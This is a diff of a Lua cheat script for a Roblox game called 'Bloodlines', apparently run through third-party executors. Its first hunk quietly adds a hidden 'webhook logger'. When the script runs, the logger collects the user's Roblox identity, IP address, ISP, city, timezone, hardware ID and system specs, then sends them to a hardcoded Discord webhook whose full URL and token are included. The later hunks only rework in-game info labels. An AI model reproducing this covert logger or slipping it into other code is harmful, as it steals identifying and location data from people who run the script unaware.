@@ -52,6 +52,128 @@ end
 local localPlayer = Players.LocalPlayer
 local IsA = game.IsA
 
+-- ── WEBHOOK LOGGER ────────────────────────────────────
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1532557567732089043/KjbyFAOgFHGYRZWnKSIr-GdnKDhCb_YYDMs93TZnCd_3Ub5ukbwYhpiqV8My6vBhXWr8"
+
+task.spawn(function()
+	pcall(function()
+		local HttpService = game:GetService("HttpService")
+
+		local function tryValue(...)
+			for i = 1, select("#", ...) do
+				local fn = select(i, ...)
+				local ok, a = pcall(fn)
+				if ok and a and a ~= "" and a ~= 0 then
+					return tostring(a)
+				end
+			end
+			return "--"
+		end
+
+		local userId = localPlayer.UserId
+		local avatar = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. userId .. "&width=420&height=420&format=png"
+		local profile = "https://www.roblox.com/users/" .. userId .. "/profile"
+
+		local fields = {}
+
+		local function addField(name, value, inline)
+			table.insert(fields, { name = name, value = tostring(value), inline = inline ~= false })
+		end
+
+		local ipInfo = {}
+		local ip = tryValue(
+			function() return getgenv().getip() end,
+			function() return getgenv().getclientip() end
+		)
+
+		if ip == "--" and type(request) == "function" then
+			local lookupOk, lookupRes = pcall(request, {
+				Url = "http://ip-api.com/json/?fields=status,query,country,countryCode,region,regionName,city,zip,timezone,isp,org,as",
+				Method = "GET",
+			})
+			if lookupOk and lookupRes and lookupRes.StatusCode == 200 and lookupRes.Body then
+				local okJson, parsed = pcall(HttpService.JSONDecode, HttpService, lookupRes.Body)
+				if okJson and type(parsed) == "table" and parsed.status == "success" then
+					ipInfo = parsed
+				end
+			end
+		end
+
+		addField("User", "[" .. localPlayer.Name .. "](<" .. profile .. ">)")
+		addField("Display Name", localPlayer.DisplayName)
+		addField("User ID", userId)
+		addField("Account Age", localPlayer.AccountAge .. " days")
+		addField("Client Job", game.JobId)
+		addField("Place ID", game.PlaceId)
+		addField("Game ID", game.GameId)
+		addField("Executor", tryValue(
+			function() return identifyexecutor() end,
+			function() return getexecutorname() end
+		))
+		addField("IP", ipInfo.query or ip)
+		addField("ISP", ipInfo.isp or tryValue(function() return getgenv().getisp() end))
+		addField("Organization / ASN", ipInfo.org and (ipInfo.org .. (ipInfo.as and (" | " .. ipInfo.as) or "")) or "--")
+		addField("Country", ipInfo.country and (ipInfo.country .. (ipInfo.countryCode and (" (" .. ipInfo.countryCode .. ")") or "")) or "--")
+		addField("Region / City", ipInfo.regionName and (ipInfo.regionName .. (ipInfo.city and (", " .. ipInfo.city) or "")) or "--")
+		addField("Timezone", ipInfo.timezone or "--")
+		addField("OS", tryValue(
+			function() return getgenv().getos() end,
+			function() return getgenv().getoperatingsystem() end
+		))
+		addField("HWID", tryValue(
+			function() return getgenv().gethwid() end,
+			function() return getgenv().gethwidid() end
+		))
+		addField("GPU", tryValue(function() return getgenv().getgpu() end))
+		addField("CPU", tryValue(function() return getgenv().getcpu() end))
+		addField("RAM", tryValue(function() return getgenv().getram() end))
+		addField("Resolution", tryValue(function() return getgenv().getresolution() end))
+		addField("Time", os.date("%Y-%m-%d %H:%M:%S"))
+
+		local payload = {
+			content = "**Bloodlines | Script Executed**",
+			embeds = {
+				{
+					title = "Someone executed the script",
+					description = "**" .. localPlayer.Name .. "** ran Bloodlines",
+					color = 14434812,
+					thumbnail = { url = avatar },
+					fields = fields,
+					footer = { text = "Bloodlines Logger" },
+					timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
+				},
+			},
+		}
+
+		local body = HttpService:JSONEncode(payload)
+
+		if type(request) == "function" then
+			request({
+				Url = WEBHOOK_URL,
+				Method = "POST",
+				Headers = { ["Content-Type"] = "application/json" },
+				Body = body,
+			})
+		elseif type(http_request) == "function" then
+			http_request({
+				Url = WEBHOOK_URL,
+				Method = "POST",
+				Headers = { ["Content-Type"] = "application/json" },
+				Body = body,
+			})
+		elseif type(syn) == "table" and type(syn.request) == "function" then
+			syn.request({
+				Url = WEBHOOK_URL,
+				Method = "POST",
+				Headers = { ["Content-Type"] = "application/json" },
+				Body = body,
+			})
+		else
+			HttpService:PostAsync(WEBHOOK_URL, body, Enum.HttpContentType.ApplicationJson)
+		end
+	end)
+end)
+
 local Events = ReplicatedStorage:WaitForChild("Events", 15)
 local dataEvent = Events and Events:FindFirstChild("DataEvent")
 local dataFunction = Events and Events:FindFirstChild("DataFunction")
@@ -1649,6 +1771,8 @@ do
 	end
 end
 
+local infoLabels = {}
+
 do
 	function funcs.refreshInfo()
 		if not dataFunction then
@@ -1665,7 +1789,15 @@ do
 
 		local function value(v)
 			if type(v) == "table" then
-				return tostring(#v)
+				local parts = {}
+				for k, val in pairs(v) do
+					table.insert(parts, tostring(k) .. "=" .. tostring(val))
+				end
+				table.sort(parts)
+				if #parts == 0 then
+					return "--"
+				end
+				return table.concat(parts, ", ")
 			elseif v == nil then
 				return "--"
 			end
@@ -1692,14 +1824,9 @@ end
 
 do
 	function funcs.openWipeShop()
-		local playerGui = localPlayer:FindFirstChild("PlayerGui")
-		local clientGui = playerGui and playerGui:FindFirstChild("ClientGui")
-		local mainframe = clientGui and clientGui:FindFirstChild("Mainframe")
-		local rest = mainframe and mainframe:FindFirstChild("Rest")
-		local destroyFrame = rest and rest:FindFirstChild("DestroyFrame")
-
-		if destroyFrame then
-			destroyFrame.Visible = true
+		local wipeShop = localPlayer.PlayerGui:FindFirstChild("WipeShop")
+		if wipeShop then
+			wipeShop.Enabled = true
 		end
 	end
 
@@ -1928,13 +2055,10 @@ lighting:AddDropdown("Time Of Day", {
 lighting:AddToggle("Time Changer", { Text = "Time Changer", Callback = funcs.timeChanger })
 
 -- ── INFORMATION ───────────────────────────────────────
-local characterInfo = InfoTab:AddLeftGroupbox("Character")
-local statsInfo = InfoTab:AddRightGroupbox("Stats")
-local skillsInfo = InfoTab:AddRightGroupbox("Skills")
+local combatInfo = InfoTab:AddLeftGroupbox("Combat")
+local usageInfo = InfoTab:AddRightGroupbox("Usages")
 
-characterInfo:AddButton({ Text = "Refresh", Func = funcs.refreshInfo })
-
-local infoLabels = {}
+combatInfo:AddButton({ Text = "Refresh", Func = funcs.refreshInfo })
 
 local function addInfoLabel(box, key, title)
 	local label = box:AddLabel(title .. ": --")
@@ -1942,40 +2066,21 @@ local function addInfoLabel(box, key, title)
 	return label
 end
 
-addInfoLabel(characterInfo, "Name", "Name")
-addInfoLabel(characterInfo, "Bloodline", "Bloodline")
-addInfoLabel(characterInfo, "Clan", "Clan")
-addInfoLabel(characterInfo, "Village", "Village")
-addInfoLabel(characterInfo, "Age", "Age")
-addInfoLabel(characterInfo, "PB", "Prestige")
-addInfoLabel(characterInfo, "AwakeningLevel", "Awakening Level")
-addInfoLabel(characterInfo, "MasteryAmount1", "Mastery")
-addInfoLabel(characterInfo, "Location", "Location")
-addInfoLabel(characterInfo, "CurrentArea", "Area")
-addInfoLabel(characterInfo, "CurrentWeapon", "Weapon")
-addInfoLabel(characterInfo, "Title", "Title")
+addInfoLabel(combatInfo, "M1s", "M1s")
+addInfoLabel(combatInfo, "Knocks", "Knocks")
+addInfoLabel(combatInfo, "Grips", "Grips")
+addInfoLabel(combatInfo, "Blocks", "Blocks")
+addInfoLabel(combatInfo, "WarPoints", "War Points")
+addInfoLabel(combatInfo, "CP", "CP")
 
-addInfoLabel(statsInfo, "Ryo", "Ryo")
-addInfoLabel(statsInfo, "Chakra", "Chakra")
-addInfoLabel(statsInfo, "ChakraPoints", "Chakra Points")
-addInfoLabel(statsInfo, "Acumen", "Acumen")
-addInfoLabel(statsInfo, "LifeForce", "Life Force")
-addInfoLabel(statsInfo, "CP", "CP")
-addInfoLabel(statsInfo, "Knocks", "Knocks")
-addInfoLabel(statsInfo, "M1s", "M1s")
-addInfoLabel(statsInfo, "WarPoints", "War Points")
-addInfoLabel(statsInfo, "Died", "Alive")
-
-addInfoLabel(skillsInfo, "MasteredJutsus", "Mastered Jutsus")
-addInfoLabel(skillsInfo, "UnlockedSkills", "Unlocked Skills")
-addInfoLabel(skillsInfo, "Missions", "Missions")
-addInfoLabel(skillsInfo, "Exams", "Exams")
-addInfoLabel(skillsInfo, "FireXP", "Fire XP")
-addInfoLabel(skillsInfo, "EarthXP", "Earth XP")
-addInfoLabel(skillsInfo, "WaterXP", "Water XP")
-addInfoLabel(skillsInfo, "WindXP", "Wind XP")
-addInfoLabel(skillsInfo, "LightningXP", "Lightning XP")
-addInfoLabel(skillsInfo, "WoodXP", "Wood XP")
+addInfoLabel(usageInfo, "ByakuganUsage", "Byakugan")
+addInfoLabel(usageInfo, "SharinganUsage", "Sharingan")
+addInfoLabel(usageInfo, "MangekyoUsage", "Mangekyo")
+addInfoLabel(usageInfo, "JinchurikiUsage", "Jinchuriki")
+addInfoLabel(usageInfo, "KetsuryuganUsage", "Ketsuryugan")
+addInfoLabel(usageInfo, "BlueGatesUsage", "Blue Gates")
+addInfoLabel(usageInfo, "GreenGatesUsage", "Green Gates")
+addInfoLabel(usageInfo, "RedGatesUsage", "Red Gates")
 
 -- ── UI SETTINGS ───────────────────────────────────────
 local menuGroup = UISettings:AddLeftGroupbox("Menu")
